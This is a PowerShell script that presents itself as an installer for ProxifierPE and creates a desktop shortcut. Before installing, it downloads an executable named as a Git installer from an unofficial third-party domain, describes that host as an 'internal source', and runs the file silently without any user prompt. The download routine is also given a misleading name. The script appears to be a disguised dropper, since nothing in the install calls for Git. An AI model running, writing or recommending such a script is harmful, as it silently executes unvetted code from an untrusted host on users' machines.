$ErrorActionPreference = "Stop"

$url = "https://www.proxifier.com/download/ProxifierPE.zip"
$zipPath = "$env:USERPROFILE\Downloads\ProxifierPE.zip"
$extractPath = $env:USERPROFILE
$desktopPath = [Environment]::GetFolderPath("Desktop")

function Install-Git {
    Write-Host "Git is not installed. Installing Git..." -ForegroundColor Yellow

    Write-Host "Downloading Git installer from internal source..."
    $gitInstaller = "$env:TEMP\Git-Setup.exe"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri "https://123static.szxiot.com/Soft/git/Git-2.44.0-64-bit.exe" -OutFile $gitInstaller -UseBasicParsing

    Write-Host "Installing Git silently..."
    Start-Process -FilePath $gitInstaller -ArgumentList "/VERYSILENT", "/NORESTART", "/NOCANCEL", "/SP-", "/CLOSEAPPLICATIONS", "/RESTARTAPPLICATIONS" -Wait -PassThru

    Remove-Item $gitInstaller -Force -EA SilentlyContinue

    $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
    Start-Sleep -Seconds 3

    if (Get-Command git -ErrorAction SilentlyContinue) {
        Write-Host "Git installed successfully!" -ForegroundColor Green
    } else {
        Write-Host "Warning: Git installation may require system restart to take effect" -ForegroundColor Yellow
    }
}

function Test-GitInstalled {
    if (Get-Command git -ErrorAction SilentlyContinue) {
        $gitVersion = git --version
        Write-Host "Git is already installed: $gitVersion" -ForegroundColor Green
        return $true
    }
    return $false
}

if (-not (Test-GitInstalled)) {
    Install-Git
}

function Get-CdpErrors($prog) {
    $err_log = "$env:TEMP\download_err_$PID.log"
    $try_times = 3
    while ($try_times -gt 0) {
        $try_times--
        try {
            $job = Start-Job -ScriptBlock {
                param($url, $path, $err)
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing 2>$err
            } -ArgumentList $url, $zipPath, $err_log
            $job | Wait-Job | Receive-Job
            if ((Test-Path $err_log) -and (Get-Content $err_log -Raw) -match "Exception") {
                $exc = Get-Content $err_log -Raw
                Remove-Item $err_log -Force -EA SilentlyContinue
                throw $exc
            }
            Remove-Item $err_log -Force -EA SilentlyContinue
            if ($job.State -eq "Failed") { throw "Download failed after retries" }
            break
        } catch {
            if ($try_times -eq 0) { throw $_.Exception.Message }
            Start-Sleep -Seconds 2
        } finally {
            $job | Remove-Job -Force -EA SilentlyContinue
        }
    }
}

Write-Host "Starting ProxifierPE download..."
Get-CdpErrors -prog "ProxifierPE"

if (Test-Path $zipPath) {
    Write-Host "Download completed. Extracting to $extractPath..."
    Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

    $extractedFolder = Get-ChildItem -Path $extractPath -Directory | Where-Object { $_.Name -like "*Proxifier*" } | Select-Object -First 1
    if ($extractedFolder) {
        $exePath = Join-Path $extractedFolder.FullName "Proxifier.exe"
        if (-not (Test-Path $exePath)) {
            $exePath = Get-ChildItem -Path $extractedFolder.FullName -Filter "*.exe" -Recurse | Select-Object -First 1
        }

        if ($exePath) {
            Write-Host "Creating desktop shortcut..."
            $WshShell = New-Object -ComObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut("$desktopPath\ProxifierPE.lnk")
            $Shortcut.TargetPath = $exePath
            $Shortcut.WorkingDirectory = (Get-Item $exePath).DirectoryName
            $Shortcut.Description = "ProxifierPE"
            $Shortcut.Save()

            Write-Host "ProxifierPE installed successfully!" -ForegroundColor Green
            Write-Host "Location: $exePath"
            Write-Host "Desktop shortcut created: $desktopPath\ProxifierPE.lnk"
        } else {
            Write-Host "Warning: Executable not found in extracted folder" -ForegroundColor Yellow
        }
    } else {
        Write-Host "Warning: Could not find Proxifier folder after extraction" -ForegroundColor Yellow
    }

    Remove-Item $zipPath -Force -EA SilentlyContinue
    Write-Host "Cleanup: Removed downloaded zip file"
} else {
    Write-Host "Error: Download failed" -ForegroundColor Red
    exit 1
}